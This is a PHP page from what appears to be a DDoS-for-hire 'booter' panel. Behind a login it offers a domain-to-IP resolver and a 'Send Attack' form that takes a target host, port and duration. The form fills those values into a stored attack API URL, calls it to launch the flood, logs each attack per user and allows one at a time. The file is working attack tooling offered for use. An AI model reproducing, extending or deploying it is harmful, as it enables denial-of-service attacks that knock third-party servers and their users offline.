<?php
include 'config.php';
include 'includes/functions.php';
if (!$user -> loggedIn())
{
	header('location: login.php');
	die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title><?php echo $sn;?> | HUB</title>
<?php include 'includes/css.php'; ?>
</head>
<body>
<?php include 'includes/header.php';?>
<div id="content">
	<div class="container">
		<div class="row">
			<?php include 'includes/stats.php';?>
			<div class="span9">
				<div id="horizontal" class="widget widget-form">
	      			
	      			<div class="widget-header">	      				
	      				<h3>
	      					IP Resolver     					
      					</h3>	
      				</div> <!-- /widget-header -->
					
					<div class="widget-content">
						<?php 
						$resolved = "";
						if (isset($_POST['resolveBtn']))
						{
							$resolved = gethostbyname($_POST['domain']);
						}
						?>
						<form class="form-horizontal" action="" method="POST">
					        <fieldset>
								<div class="control-group">
									<label class="control-label" for="input01">Domain</label>
										<div class="controls">
										  <input name="domain" value="<?php echo $resolved;?>" type="text" class="input-large" id="input01">
										  <p class="help-block">Domain to resolve</p>
										</div>
								</div>
								<div class="form-actions">
									<input type="submit" name="resolveBtn" class="btn btn-primary btn-large" value="Resolve">
								</div>
					        </fieldset>
					      </form>	
					</div> <!-- /widget-content -->
						
				</div>	
				<div id="horizontal" class="widget widget-form">
	      			
	      			<div class="widget-header">	      				
	      				<h3>
	      					Boot HUB      					
      					</h3>	
      				</div> <!-- /widget-header -->
					<div class="widget-content">
							<?php
							if (isset($_POST['bootBtn']))
							{
								$host = $_POST['host'];
								$port = $_POST['port'];
								$time = $_POST['time'];
								if (empty($host) || empty($port) || empty($time))
								{
									$show -> showError('Please fill in all fields');
								}
								else
								{
								
									if (!filter_var($host, FILTER_VALIDATE_IP))
									{
										$show -> showError('Please enter a valid IP');
									}
									else
									{
										$SQLRunning = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :user AND `time` + `date` > UNIX_TIMESTAMP()");
										$SQLRunning -> execute(array(':user' => $_SESSION['username']));
										$running = $SQLRunning -> fetchColumn(0);
										if ($running > 0)
										{
											$show -> showError('You currently have an attack running. Please wait for it to be over before sending another.');
										}
										else
										{
											$SQLSelectAPI = $odb -> query("SELECT `API` FROM `settings`");
											$arrayFind = array('[host]', '[port]', '[time]');
											$arrayReplace = array($host, $port, $time);
											$APILink = str_replace($arrayFind, $arrayReplace, $SQLSelectAPI -> fetchColumn(0));
											@file_get_contents($APILink);
											$insertSQL = $odb -> prepare("INSERT INTO `logs` VALUES (NULL, :user, :ip, :port, :time, UNIX_TIMESTAMP())");
											$insertSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => intval($port), ':time' => intval($time)));
											$show -> showSuccess("Attack has been sent to {$host}:{$port} for {$time} seconds");
										}
									}
								}
							}
							?>
						<form class="form-horizontal" action="" method="POST">
							<fieldset>
								<div class="control-group">
									<label class="control-label" for="input01">Host</label>
										<div class="controls">
										  <input type="text" class="input-large" name="host">
										  <p class="help-block">Host to send attack</p>
										</div>
								</div>
								<div class="control-group">
									<label class="control-label" for="input01">Port</label>
										<div class="controls">
										  <input type="text" class="input-large" name="port">
										  <p class="help-block">Port to send attack</p>
										</div>
								</div>
								<div class="control-group">
									<label class="control-label" for="input01">Time</label>
										<div class="controls">
										  <input type="text" class="input-large" name="time">
										  <p class="help-block">Time to send attack</p>
										</div>
								</div>
								<div class="form-actions">
									<input value="Send Attack" name="bootBtn" type="submit" class="btn btn-primary btn-large" />
								</div>
					        </fieldset>
					      </form>	
					</div> <!-- /widget-content -->
				</div>	
			</div>
		</div>
	</div> <!-- /.container -->
</div> <!-- /#content -->
<?php include 'includes/footer.php';?>
  </body>
</html>
